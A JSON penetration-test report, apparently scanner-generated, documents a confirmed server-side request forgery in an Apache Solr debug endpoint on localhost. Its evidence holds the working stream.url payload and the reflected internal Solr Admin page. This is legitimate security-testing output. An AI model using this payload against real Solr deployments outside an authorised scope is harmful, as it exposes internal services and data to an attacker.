@@ -1,0 +1,57 @@
+{
+  "id": "9a5bb222-44f4-4a62-ab40-377278f8e28e",
+  "engagement_name": "Solr RemoteStreaming SSRF",
+  "target_scope": [
+    "localhost",
+    "127.0.0.1"
+  ],
+  "test_start": "2026-07-15T15:25:18.749537Z",
+  "test_end": "2026-07-15T15:25:18.749537Z",
+  "generated_at": "2026-07-15T15:25:18.751487Z",
+  "executive_summary": {
+    "overview": "Penetration test of localhost, 127.0.0.1. 1 findings identified.",
+    "risk_rating": "High",
+    "critical_count": 0,
+    "high_count": 1,
+    "medium_count": 0,
+    "low_count": 0,
+    "info_count": 0,
+    "key_findings": [],
+    "recommendations": []
+  },
+  "hosts": [],
+  "findings": [
+    {
+      "id": "a01b8aab-3a8b-43e9-b69f-0ea9da0f992c",
+      "title": "Server-Side Request Forgery (SSRF) \u2014 reflected_internal",
+      "description": "Technique: WSTG-INPV-19 (SSRF). Parameter: stream.url.",
+      "severity": "high",
+      "status": "confirmed",
+      "target": "http://localhost:8983/solr/demo/debug/dump",
+      "evidence": [
+        "Request: SSRF reflected_internal http://localhost:8983/solr/demo/debug/dump \u2014 stream.url=http://127.0.0.1:8983/solr/",
+        "Response: loopback fetch reflected in-scope internal content ('Solr Admin') via http://127.0.0.1:8983/solr/ (status 200)",
+        "phases_completed=6 verified=True strength=verified",
+        "exploitation_type=reflected_internal",
+        "capability=fetch_confirmed=True,content_reflected=True,schemes=['http']",
+        "candidate_param=stream.url",
+        "internal_target=http://127.0.0.1:8983/solr/",
+        "indicator_type=internal_service",
+        "indicator_observed=loopback fetch reflected in-scope internal content ('Solr Admin') via http://127.0.0.1:8983/solr/ (status 200)",
+        "confirmation=P3 target=http://127.0.0.1:8983/solr/ status=200",
+        "internal_content_marker='Solr Admin' (content we never sent; control_reflected_it=False)",
+        "confirming_excerpt: \u2026ed.\\nSee the License for the specific language governing permissions and\\nlimitations under the License.\\n-->\\n\\n<head>\\n <title>Solr Admin</title>\\n\\n <link rel=\\\"icon\\\" type=\\\"image/x-icon\\\" href=\\\"img/favicon.ico?_=8.8.1\\\">\\n <link rel=\\\"shortcut icon\\\" type=\\\"ima\u2026",
+        "control [non-resolving control host clinkz-ssrf-control.invalid (no server-side fetch \u2014 marker absent)] status=500",
+        "control_excerpt: { \"responseHeader\":{ \"status\":500, \"QTime\":32, \"handler\":\"org.apache.solr.handler.DumpRequestHandler\", \"params\":{ \"stream.url\":\"http://clinkz-ssrf-control.invalid/\"}}, \"params\":{ \"stream.url\":\"http://clinkz-ssrf-control.invalid/\", \"echoHandler\":\"true\", \"echoParams\":\"explicit\"}, \"error\":{ \"msg\":\"clinkz-ssrf-control.\u2026"
+      ],
+      "cvss_score": null,
+      "cve_ids": [],
+      "references": [],
+      "remediation": "",
+      "discovered_at": "2026-07-15T15:25:05.533476Z",
+      "validated_at": null
+    }
+  ],
+  "methodology": "",
+  "appendices": {}
+}
